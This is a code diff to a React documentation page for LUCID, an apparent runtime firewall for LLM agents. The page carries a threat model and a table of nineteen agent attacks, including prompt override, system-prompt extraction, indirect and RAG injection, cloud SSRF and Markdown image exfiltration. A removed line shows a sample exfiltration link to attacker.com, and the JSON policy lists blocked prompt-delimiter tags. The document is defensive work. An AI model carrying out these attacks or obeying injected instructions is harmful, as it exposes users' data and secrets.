@@ -20,6 +20,21 @@ const DOCS: { id: DocId; label: string; blurb: string }[] = [
   },
 ];
 
+function TitleWithAmpersand({ text }: { text: string }) {
+  const parts = text.split(" & ");
+  if (parts.length === 1) return <>{text}</>;
+  return (
+    <>
+      {parts.map((part, i) => (
+        <span key={i}>
+          {part}
+          {i < parts.length - 1 && <span className="font-sans font-normal text-current"> &amp; </span>}
+        </span>
+      ))}
+    </>
+  );
+}
+
 /* ------------------------------------------------------------------ shared ui */
 
 function Section({ num, title, children }: { num: string; title: string; children: ReactNode }) {
@@ -27,7 +42,7 @@ function Section({ num, title, children }: { num: string; title: string; childre
     <section className="space-y-3">
       <h2 className="font-serif text-xl font-semibold text-accent sm:text-2xl">
         <span className="mr-2.5 font-mono text-xs font-normal text-muted">{num}.</span>
-        {title}
+        <TitleWithAmpersand text={title} />
       </h2>
       {children}
     </section>
@@ -49,46 +64,39 @@ function Code({ children }: { children: ReactNode }) {
 /* ----------------------------------------------------------------- doc 1 data */
 
 const ASSETS: { asset: string; impact: string }[] = [
-  { asset: "The database", impact: "Stolen records, forged edits, or a wiped table." },
-  { asset: "Infrastructure secrets", impact: "Internal services and paid APIs fall open." },
-  { asset: "Side-effect tools", impact: "Accounts deleted, passwords reset, commands run." },
-  { asset: "The API budget", impact: "Credits drained, and the service goes down with the bill." },
-  { asset: "The agent's loyalty", impact: "The agent is turned against its own users." },
-];
-
-const IMPACTS: { family: string; asset: string; result: string }[] = [
-  { family: "Token leak, Markdown exfil", asset: "Infrastructure secrets", result: "Master keys compromised, machine identity spoofed." },
-  { family: "Tool chaining, SQL injection", asset: "The database", result: "Tables wiped, client files stolen, accounts hijacked." },
-  { family: "RAG poisoning, indirect injection", asset: "The agent's decision", result: "Silent takeover, with no direct contact." },
-  { family: "Tool-loop DoS", asset: "The API budget", result: "Credits burned, the service stops on the bill." },
+  { asset: "The database", impact: "Stolen records, forged edits, or wiped tables." },
+  { asset: "Infrastructure secrets", impact: "Exposed API keys and internal services." },
+  { asset: "Side-effect tools", impact: "Deleted accounts, reset passwords, or executed commands." },
+  { asset: "The API budget", impact: "Drained credits that take the service down." },
+  { asset: "The agent's loyalty", impact: "The agent turns against its own users." },
 ];
 
 interface Row { id: string; name: string; owasp: string; what: string }
 const T1: Row[] = [
   { id: "T1-01", name: "Direct Prompt Override", owasp: "LLM01", what: "Told to forget its rules and prove it." },
-  { id: "T1-02", name: "System Prompt Extraction", owasp: "LLM07", what: "Reads its hidden prompt out loud, token and all." },
-  { id: "T1-03", name: "Dangerous Function Call", owasp: "LLM06", what: "Deletes an account on command, no check." },
+  { id: "T1-02", name: "System Prompt Extraction", owasp: "LLM07", what: "Reads its hidden prompt out loud, secret and all." },
+  { id: "T1-03", name: "Dangerous Function Call", owasp: "LLM06", what: "Deletes an account on command without checking." },
 ];
 const T2: Row[] = [
   { id: "T2-01", name: "Delimiter & Tag Injection", owasp: "LLM01", what: "Fake system tags fence off a hidden order." },
   { id: "T2-02", name: "Homoglyph Substitution", owasp: "LLM01", what: "Cyrillic look-alikes slip past the filter." },
-  { id: "T2-03", name: "Encoding Obfuscation", owasp: "LLM01", what: "The order hides in Base64, then runs." },
+  { id: "T2-03", name: "Encoding Obfuscation", owasp: "LLM01", what: "The command hides in Base64, then runs." },
   { id: "T2-04", name: "Parameter Injection", owasp: "LLM06", what: "Negative and wildcard values pass unchecked." },
-  { id: "T2-05", name: "Cross-Lingual Evasion", owasp: "LLM01", what: "The same order, in a language filters never learned." },
+  { id: "T2-05", name: "Cross-Lingual Evasion", owasp: "LLM01", what: "The same order in a language filters missed." },
 ];
 const T3: Row[] = [
-  { id: "T3-01", name: "Stored / Indirect Injection", owasp: "LLM01", what: "A trap hides inside a review to summarise." },
+  { id: "T3-01", name: "Stored / Indirect Injection", owasp: "LLM01", what: "A trap hides inside text the agent reads on its own." },
   { id: "T3-02", name: "Tool-Loop DoS", owasp: "LLM10", what: "An endless tool loop drains the budget." },
-  { id: "T3-03", name: "Fake Backend Event", owasp: "LLM01", what: "A forged emergency unlocks root." },
-  { id: "T3-04", name: "Confused Deputy", owasp: "LLM06", what: "Two safe tools chain into a stranger's reset." },
-  { id: "T3-05", name: "Cloud SSRF Extraction", owasp: "LLM06", what: "The fetch tool lifts cloud metadata keys." },
+  { id: "T3-03", name: "Fake Backend Event", owasp: "LLM01", what: "A forged emergency unlocks root privileges." },
+  { id: "T3-04", name: "Confused Deputy", owasp: "LLM06", what: "Two safe tools chain into an account reset." },
+  { id: "T3-05", name: "Cloud SSRF Extraction", owasp: "LLM06", what: "The fetch tool lifts cloud metadata credentials." },
 ];
 const T4: Row[] = [
-  { id: "T4-01", name: "Markdown Exfiltration", owasp: "LLM02", what: "The token rides out inside an image link." },
-  { id: "T4-02", name: "Multi-turn Crescendo", owasp: "LLM01", what: "Friendly turns lower the guard before the ask." },
-  { id: "T4-03", name: "Attention Saturation", owasp: "LLM01", what: "Filler buries the order until rules drop out." },
-  { id: "T4-04", name: "RAG Vector Poisoning", owasp: "LLM04", what: "A payload planted days earlier wakes on a search." },
-  { id: "T4-05", name: "Arbitrary Shell Execution", owasp: "LLM06", what: "A fake diagnostic runs a shell command." },
+  { id: "T4-01", name: "Markdown Exfiltration", owasp: "LLM02", what: "The secret rides out inside an image link." },
+  { id: "T4-02", name: "Multi-turn Crescendo", owasp: "LLM01", what: "Friendly turns lower the guard before the real ask." },
+  { id: "T4-03", name: "Attention Saturation", owasp: "LLM01", what: "Filler text buries the order until rules drop out." },
+  { id: "T4-04", name: "RAG Vector Poisoning", owasp: "LLM04", what: "A payload planted in the database wakes on search." },
+  { id: "T4-05", name: "Arbitrary Shell Execution", owasp: "LLM06", what: "A fake diagnostic command runs in the shell." },
   { id: "T4-06", name: "Shadow Tool Poisoning", owasp: "LLM03", what: "A new outside tool registers at runtime." },
 ];
 
@@ -102,7 +110,9 @@ function TierTable({ title, rows }: { title: string; rows: Row[] }) {
             {rows.map((r) => (
               <tr key={r.id} className="hover:bg-surface/30">
                 <td className="whitespace-nowrap px-3 py-2.5 font-mono text-[11px] font-medium text-foreground/90">{r.id}</td>
-                <td className="whitespace-nowrap px-3 py-2.5 font-sans text-[12px] text-foreground/85">{r.name}</td>
+                <td className="whitespace-nowrap px-3 py-2.5 font-sans text-[12px] text-foreground/85">
+                  <TitleWithAmpersand text={r.name} />
+                </td>
                 <td className="whitespace-nowrap px-3 py-2.5 font-mono text-[10px] text-muted">{r.owasp}</td>
                 <td className="px-3 py-2.5 font-sans text-[12px] text-foreground/70">{r.what}</td>
               </tr>
@@ -119,7 +129,7 @@ function ThreatDoc() {
     <div className="space-y-12">
       <Section num="01" title="Assets under threat">
         <P>
-          An LLM on its own has very little leverage. It can hallucinate or produce toxic text, but it cannot delete an account, read a secret key, or make a network call. The threat begins the moment the model is given tools. Tools are the hands through which the model acts on real systems.
+          An LLM alone has very little power. It can hallucinate. But it cannot delete an account, read a secret key, or make a network call. The threat starts the moment you give the model tools. Tools are the hands it uses to act on real systems.
         </P>
         <div className="mt-4 overflow-x-auto rounded-sm border border-border/80 bg-surface/20">
           <table className="w-full text-left text-xs">
@@ -143,31 +153,31 @@ function ThreatDoc() {
 
       <Section num="02" title="The four attacker archetypes">
         <P>
-          Security controls often fail because they assume every attack comes from an untrusted stranger in a public chat. In reality, four distinct attacker profiles target agentic systems, each using a different trust boundary.
+          Most security setups assume the attacker is just an anonymous person in the chat. In practice, four different attackers target an agent.
         </P>
         <div className="mt-4 space-y-3">
           <div className="rounded-sm border border-border/70 bg-surface/20 p-4">
-            <p className="font-mono text-xs font-semibold text-accent">1. Direct Abuser (Prompt Injection)</p>
+            <p className="font-mono text-xs font-semibold text-accent">1. Direct Abuser</p>
             <p className="mt-1 text-xs leading-relaxed text-foreground/80">
-              A regular user typing into the chat interface. Uses instruction overrides, persona adoption, roleplay framing, or linguistic evasion to bypass developer rules and extract perks or internal prompts.
+              An ordinary user typing in the chat. Uses roleplay, trick questions, or strange encodings to bypass rules and steal the system prompt.
             </p>
           </div>
           <div className="rounded-sm border border-border/70 bg-surface/20 p-4">
-            <p className="font-mono text-xs font-semibold text-accent">2. Industrial Competitor (Automated Extraction)</p>
+            <p className="font-mono text-xs font-semibold text-accent">2. Competitor</p>
             <p className="mt-1 text-xs leading-relaxed text-foreground/80">
-              An adversary with scripting capabilities seeking mass data extraction, API key harvesting, or proprietary system prompt recreation through high-volume systematic probing.
+              An organized attacker scripting the chat. Probes the model to harvest cloud keys, proprietary logic, or customer records.
             </p>
           </div>
           <div className="rounded-sm border border-border/70 bg-surface/20 p-4">
-            <p className="font-mono text-xs font-semibold text-accent">3. Indirect Saboteur (RAG & Web Traps)</p>
+            <p className="font-mono text-xs font-semibold text-accent">3. Invisible Saboteur</p>
             <p className="mt-1 text-xs leading-relaxed text-foreground/80">
-              Never communicates directly with the agent. Plants payload instructions inside third-party websites, PDF files, emails, or repositories that the agent retrieves during autonomous execution.
+              Never talks to the agent directly. Plants instructions inside web pages, PDFs, or repositories that the agent reads on its own.
             </p>
           </div>
           <div className="rounded-sm border border-border/70 bg-surface/20 p-4">
-            <p className="font-mono text-xs font-semibold text-accent">4. Financial Denial of Service (Resource Drain)</p>
+            <p className="font-mono text-xs font-semibold text-accent">4. Financial DoS</p>
             <p className="mt-1 text-xs leading-relaxed text-foreground/80">
-              Abuses multi-step reasoning to trigger recursive tool calls, infinite reflection loops, or intensive computational tasks, causing rapid API quota and operational budget exhaustion.
+              Traps the agent in an endless tool loop. Burns through the API token quota and takes the service down with the bill.
             </p>
           </div>
         </div>
@@ -175,7 +185,7 @@ function ThreatDoc() {
 
       <Section num="03" title="The 19 OWASP LLM attack vectors">
         <P>
-          LUCID evaluates and mitigates nineteen concrete attack probes, categorized across four severity tiers from naive prompt overrides to state-of-the-art vector poisoning.
+          LUCID is built to stop nineteen concrete attacks, tested across four tiers of difficulty.
         </P>
         <TierTable title="Tier 1 · Naïve baseline" rows={T1} />
         <TierTable title="Tier 2 · Syntactic evasion" rows={T2} />
@@ -198,14 +208,12 @@ const POLICY_SAMPLE = `{
       "block_structural_delimiters": [
         "</user_input>",
         "<system_directive>",
-        "[INST]",
-        "<<SYS>>"
+        "[INST]"
       ]
     },
     "tool_shield": {
       "human_in_the_loop": [
-        "delete_account",
-        "execute_database_query"
+        "delete_account"
       ],
       "circuit_breaker": {
         "max_tool_calls_per_turn": 3,
@@ -219,8 +227,7 @@ const POLICY_SAMPLE = `{
     },
     "output_shield": {
       "redact_canary_tokens": ["CANARY_2026_SECRET_KEY"],
-      "block_external_images": true,
-      "sanitize_markdown_links": true
+      "block_external_images": true
     }
   }
 }`;
@@ -228,91 +235,91 @@ const POLICY_SAMPLE = `{
 function GuideDoc() {
   return (
     <div className="space-y-12">
-      <Section num="01" title="The Execution Boundary Philosophy">
+      <Section num="01" title="Defending the Boundary">
         <P>
-          System prompts alone cannot guarantee safety. When an adversarial user convinces a model to ignore its prompt, internal guardrails collapse.
+          Prompts cannot stop an attack on their own. Once a model is tricked, internal rules drop.
         </P>
         <P>
-          LUCID operates as an <strong>external runtime firewall</strong>. It sits directly between the LLM and the tools in your Python application code. It never touches the model's weights and never requires fine-tuning. Instead, it enforces zero-trust validation at the execution boundary: every incoming message, every emitted tool call, every tool output, and every final reply must pass through strict programmatic filters before reaching the database or the user.
+          LUCID sits between the model and the tools. It never touches model weights. It inspects what comes in, what the model calls, and what goes out. If an order breaks a rule, LUCID stops it before code runs.
         </P>
       </Section>
 
-      <Section num="02" title="Quickstart & 3-Line Integration">
+      <Section num="02" title="Quickstart & Integration">
         <P>
-          LUCID wraps any existing agent without architectural changes. Load your declarative policy file and wrap your agent instance:
+          You can protect any agent in three lines of Python:
         </P>
         <Code>{`from lucid.guard import LucidGuardrail
 
-# 1. Load the defensive policy
+# 1. Load the policy file
 guard = LucidGuardrail.from_policy_file("lucid_policy.json")
 
-# 2. Wrap your target agent
+# 2. Wrap your agent
 protected_agent = guard.wrap(my_agent)
 
-# 3. Chat with complete safety
+# 3. Chat safely
 response = protected_agent.chat("Delete account u_1002")
-# -> Refused by Tool Shield: requires explicit operator approval.`}</Code>
+# -> Refused by Tool Shield: requires operator approval.`}</Code>
       </Section>
 
-      <Section num="03" title="The Four Sequential Checkpoints">
+      <Section num="03" title="The Four Shields">
         <P>
-          Every conversation turn passes through four defensive shields:
+          Every message passes through four checkpoints:
         </P>
         <div className="mt-4 space-y-3">
           <div className="rounded-sm border border-border/70 bg-surface/20 p-4">
-            <p className="font-mono text-xs font-semibold text-accent">1. Input Shield (Pre-LLM)</p>
+            <p className="font-mono text-xs font-semibold text-accent">1. Input Shield</p>
             <p className="mt-1 text-xs leading-relaxed text-foreground/80">
-              Normalizes text with NFKC Unicode rules, replaces Cyrillic homoglyphs with their ASCII equivalents, and strips fake structural delimiter tags (<code className="font-mono text-[11px] text-accent">&lt;/user_input&gt;</code>) to neutralize prompt injection before tokens reach the model.
+              Cleans text before the model sees it. Replaces Cyrillic look-alikes with plain letters, normalizes Unicode, and removes fake tags.
             </p>
           </div>
 
           <div className="rounded-sm border border-border/70 bg-surface/20 p-4">
-            <p className="font-mono text-xs font-semibold text-accent">2. Pre-Tool Shield & Parameter Bounds (Pre-Execution)</p>
+            <p className="font-mono text-xs font-semibold text-accent">2. Tool Shield</p>
             <p className="mt-1 text-xs leading-relaxed text-foreground/80">
-              When the model emits a tool call, LUCID intercepts it before dispatch. Pydantic schemas validate that numbers fall within safe ranges (e.g., calories cannot be negative). Critical functions (account deletion, raw SQL execution) are halted until explicit human confirmation is provided.
+              Catches tool calls before dispatch. Checks arguments against Pydantic rules and holds sensitive actions, like account deletion, for human approval.
             </p>
           </div>
 
           <div className="rounded-sm border border-border/70 bg-surface/20 p-4">
-            <p className="font-mono text-xs font-semibold text-accent">3. Sliding-Window Circuit Breaker (Loop Defense)</p>
+            <p className="font-mono text-xs font-semibold text-accent">3. Circuit Breaker</p>
             <p className="mt-1 text-xs leading-relaxed text-foreground/80">
-              Monitors tool invocation frequency per turn. If an agent loops on the same tool call or exceeds turn limits (e.g., &gt; 3 calls), the breaker trips, aborting the recursion and enforcing a 60-second cooldown to protect the API budget.
+              Counts tool calls per turn. If an agent loops on the same tool or calls too many, the breaker trips and cools down for sixty seconds.
             </p>
           </div>
 
           <div className="rounded-sm border border-border/70 bg-surface/20 p-4">
-            <p className="font-mono text-xs font-semibold text-accent">4. Output Shield (Post-Execution)</p>
+            <p className="font-mono text-xs font-semibold text-accent">4. Output Shield</p>
             <p className="mt-1 text-xs leading-relaxed text-foreground/80">
-              Scans the agent's final text for leaked canary tokens, internal API keys, or exfiltration Markdown image links (<code className="font-mono text-[11px] text-accent">![leak](https://attacker.com?token=...)</code>), redacting secrets before the user sees them.
+              Scans the final answer before the user sees it. Redacts secret keys, canary tokens, and hidden Markdown image links.
             </p>
           </div>
         </div>
       </Section>
 
-      <Section num="04" title="Declarative Policy Specification">
+      <Section num="04" title="The Policy File">
         <P>
-          LUCID uses a clean JSON policy format generated directly by MIRAGE or written by hand. Rules are transparent, auditable, and version-controlled alongside application code:
+          Rules live in a single JSON file. MIRAGE can generate this file automatically from the exploits it finds, or you can write it by hand:
         </P>
         <Code>{POLICY_SAMPLE}</Code>
       </Section>
 
-      <Section num="05" title="CLI Policy Inspection">
+      <Section num="05" title="CLI Policy Check">
         <P>
-          Operators can verify any policy file instantly from the terminal using the LUCID command-line interface:
+          Inspect your rules from the terminal:
         </P>
         <Code>lucid policy ./reports/lucid_policy.json</Code>
         <P>
-          This command prints a formatted table displaying active delimiters, parameter rules, and canary token lists.
+          This prints active shields, tool bounds, and canary secrets in a clean table.
         </P>
       </Section>
 
-      <Section num="06" title="Closed-Loop Verification Suite">
+      <Section num="06" title="Proving the Defense">
         <P>
-          The ultimate test of a defense system is replaying real exploits against it. LUCID integrates with the MIRAGE test harness to run the full 19-probe matrix in both unprotected and protected modes:
+          A defense only matters if you test it. LUCID replays all nineteen attacks from MIRAGE against the guarded agent:
         </P>
         <Code>lucid verify --policy ./reports/lucid_policy.json</Code>
         <P>
-          On the MyBelly assistant, this test proves the security transformation:
+          On the MyBelly assistant, this test proves the security change:
         </P>
         <div className="mt-4 overflow-x-auto rounded-sm border border-border/80 bg-surface/20">
           <table className="w-full text-left text-xs">
@@ -342,9 +349,9 @@ response = protected_agent.chat("Delete account u_1002")
         </div>
       </Section>
 
-      <Section num="07" title="Automated Regression Testing">
+      <Section num="07" title="Automated Regression Tests">
         <P>
-          All 35 automated tests run in 0.39 seconds via Pytest, confirming that shield mechanics, sliding-window cooldowns, and parameter validation remain regression-free:
+          Thirty-five automated tests run in under half a second:
         </P>
         <Code>pytest tests/ -v</Code>
       </Section>
@@ -398,7 +405,7 @@ export function LucidDocs() {
                 }`}
               >
                 <p className={`font-mono text-[13px] font-semibold ${on ? "text-accent" : "text-foreground/80"}`}>
-                  {d.label}
+                  <TitleWithAmpersand text={d.label} />
                 </p>
                 <p className="mt-1 font-sans text-xs text-muted">{d.blurb}</p>
               </button>
